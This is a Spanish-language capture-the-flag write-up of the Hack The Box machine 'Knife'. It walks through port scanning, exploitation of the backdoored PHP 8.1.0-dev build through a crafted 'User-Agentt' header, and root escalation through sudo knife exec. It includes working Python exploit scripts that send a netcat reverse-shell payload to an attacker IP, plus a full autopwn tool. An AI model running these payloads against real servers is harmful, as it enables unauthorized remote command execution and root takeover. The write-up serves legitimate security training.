# KNIFE

## Reconocimiento

### Nmap
Lo primero que haremos será enumerar los puertos abiertos en la máquina víctima, para ello usaremos [nmap](https://github.com/nmap/nmap), al que le indicaremos que queremos filtrar el rango de puertos completo, que solo nos muestre los puertos que estén abiertos y que usaremos el método de enumeración TCP Syn Port Scan. Opcionalmente se pueden desactivar el descubrimiento de hosts y la resolución DNS para agilizar el escaneo. Por último, exportaremos las evidencias al fichero allPorts:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.242
```

```bash
File: allPorts

# Nmap 7.91 scan initiated Wed Jun 16 22:08:18 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.242
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.242 ()	Status: Up
Host: 10.10.10.242 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Wed Jun 16 22:08:29 2021 -- 1 IP address (1 host up) scanned in 11.69 seconds
```

<br>

Efectuaremos un escaneo más exhaustivo para ver los servicios y versiones que corren bajo estos puertos abiertos, exportaremos las evidencias al fichero targeted:

```bash
nmap -sC -sV -p22,80 -oN targeted 10.10.10.242
```

```bash
File: targeted

# Nmap 7.91 scan initiated Wed Jun 16 22:09:14 2021 as: nmap -sC -sV -p22,80 -oN targeted 10.10.10.242
Nmap scan report for 10.10.10.242
Host is up (0.040s latency).


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 16 22:09:22 2021 -- 1 IP address (1 host up) scanned in 8.65 seconds
```

<br>

### WhatWeb
Procederemos a lanzar un [WhatWeb](https://github.com/urbanadventurer/WhatWeb) al servicio HTTP para ver si nos reporta algún parámetro de interés:

```bash
File: whatWeb

http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.42 (Ubunut)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

Vemos que el servidor web nos reporta bastante información, entre otros la versión del servidor web y la versión de PHP bajo la que corre. 

<br>

## Shell de usuario

### Enumeración
Procederemos a buscar vulnerabilidades conocidas para las versiones que corre el servidor web. Para ello usaremos la herramienta [SearchSploit](https://github.com/offensive-security/exploitdb) que nos permitirá buscar en https://www.exploit-db.com/ desde la línea de comandos.

Buscaremos la versión de PHP en searchsploit:

```bash
searchsploit php 8.1.0-dev
```

<br>

<img src="https://i.imgur.com/IsnNwKE.png" width=400>

Veremos que tenemos un exploit para conseguir ejecución remota de comandos en la version de PHP con la que contamos. Procederemos a analizarlo y veremos que el exploit consiste en un backdoor que se introdujo en ciertas vesiones de PHP. Bastará con enviar una cabecera determinada al servidor web, que nos permitirá ejecutar comando a nivel de sistema. La cabecera tendrá el siguiente formato:

```plaintext
User-Agentt: zerdoiumsystem(whoami);
```

<br>

### Exploiting
Nos construiremos un script con [Python3](https://www.python.org/downloads/) que nos permitirá explotar esta vulnerabilidad y que nos enviará una reverse shell:

```python
File: php-8.0.1-dev_backdoor.py

#!/usr/bin/python3
#coding: utf-8


# PHP 8.0.1-dev Backdoor
# Author: Gaizka Martin (a.k.a g2jz)


import requests
import sys


s = requests.Session() 


def main():
	r = s.get(sys.argv[1], headers={"User-Agentt":"zerodiumsystem(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.175 443 >/tmp/f\");"})


if __name__ == "__main__":
	if(len(sys.argv)==2):
		main()
	else:
		print("Uso: " + sys.argv[0] + " <http://test>")
```

Nos pondremos en escucha con [Netcat](http://netcat.sourceforge.net/) por el puerto 443:

```bash
nc -nlvp 443
```

Al ejecutar el exploit:

<img src="https://i.imgur.com/mPD6ZtZ.png" width=600>

En este punto y como el usuario james procederemos a leer la flag user.txt en el directorio /home/james.

<br>

## Shell de root

### Enumeración
Comenzaremos enumerando el sistema para ver de que forma podemos escalar privilegios.

Lo primero que haremos será comprobar si nuestro usuario puede ejecutar algún comando como el usuario root, para ello:

<img src="https://i.imgur.com/Zsleo0I.png" width=700>

<br>

### Binario knife
Nos encontraremos con el binario knife, el cual podremos ejecutar como el usuario root sin necesidad de proporcionar contraseña.

Veremos si tenemos algún tipo de panel de ayuda para el binario:

<img src="https://i.imgur.com/vtBtLLb.png" width=300>

Como vemos el panel de ayuda cuenta con 375 líneas por lo que tendremos que analizarlo con atención.

Nos encontraremos con el siguiente argumento que nos permitirá ejecutar un script:

<img src="https://i.imgur.com/6C7lQZb.png" width=300>

El problema de esto es que no sabremos que tipo de script será el que tenemos que proporcionarle, por lo que tendremos que investigar un poco más sobre ello.

Nos dirigiremos a la [documentación sobre la función exec de knife](https://docs.chef.io/workstation/knife_exec/):

<img src="https://i.imgur.com/oiodYLA.png" width=700>

Podremos ver como los scripts que ejecuta son en el lenguaje [Ruby](https://www.ruby-lang.org/es/downloads/) por lo que nos construiremos un script sencillo que nos spawnee una shell:

```ruby
File: knifeShell.rb

#!/usr/bin/ruby -w

system("/bin/bash")
```

Lo último que nos quedará por hacer será ejecutar la herramienta knife con los permisos del usuario root y mediante el parámetro exec proporcionarle nuestro script en [Ruby](https://www.ruby-lang.org/es/downloads/):

<img src="https://i.imgur.com/kOefV8v.png" width=400>

Por último, obtendremos una shell como el usuario root y visualizaremos la flag root.txt que se encuentra en el directorio /root.

<br>

## Autopwn
Ya que estamos ante una escalada y una intrusión sencillas, automatizaremos estas dos con un script en [Python3](https://www.python.org/downloads/):

```python
File: autopwn.py

#!/usr/bin/python3
#coding: utf-8


# Knife Machine Autopwn
# Author: Gaizka Martin (a.k.a g2jz)


import requests
import sys
import threading
import time


from pwn import *


# Variables globales
lport = 443


# Sesion HTTP
s = requests.Session()


# Barras de progreso
p1 = log.progress("RCE")
p2 = log.progress("Reverse Shell")


# Ctrl C
def handler(signal,frame):
	log.failure("Saliendo...")
	sys.exit(1)


signal.signal(signal.SIGINT,handler)


# Intrusion
def obtainShell():
	try:
		p1.status("Enviando...")
		time.sleep(1)
		
		# Exploit
		header_data= {
			"User-Agentt":"zerodiumsystem(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %s >/tmp/f\");" % (sys.argv[2],lport)
		}


		r = s.get(sys.argv[1], headers=header_data)


		p1.success("Enviada")
		time.sleep(1)
	except:
		log.failure("Ha ocurrido un error!")
		sys.exit(1)




# Main
if __name__ == "__main__":
	# Comprobacion argv
	if(len(sys.argv)==3):
		try:
			threading.Thread(target = obtainShell).start()
		except Exception as e:
			log.error(str(e))


		p2.status("Esperando conexion...")


		# Listener
		shell = listen(lport,timeout=20).wait_for_connection()


		# Connection checker
		if shell.sock is None:
			log.failure("No se ha obtenido ninguna conexion!")
			sys.exit(1)
		else:
			p2.success("Conexion obtenida")
			time.sleep(1)


			# Nos situamos en el directorio de trabajo
			shell.sendline(b'cd /tmp')
			
			# Escalada de privilegios
			payload = b'''echo -e "#\!/usr/bin/ruby -w\n\nsystem('/bin/bash')" > k.rb'''
			shell.sendline(payload)


			execute_payload = b'sudo /usr/bin/knife exec k.rb'
			shell.sendline(execute_payload)


			# Interactive shell
			shell.interactive()
	
	else:
		# Usage
		print("Usage: " + sys.argv[0] + " <http://RHOST>" + " <LHOST>")


```

<br>

<img src="https://i.imgur.com/013KmZf.png" width=700>

Veremos que obtenemos una shell como el usuario root y podremos leer la flag root.txt en el directorio /root.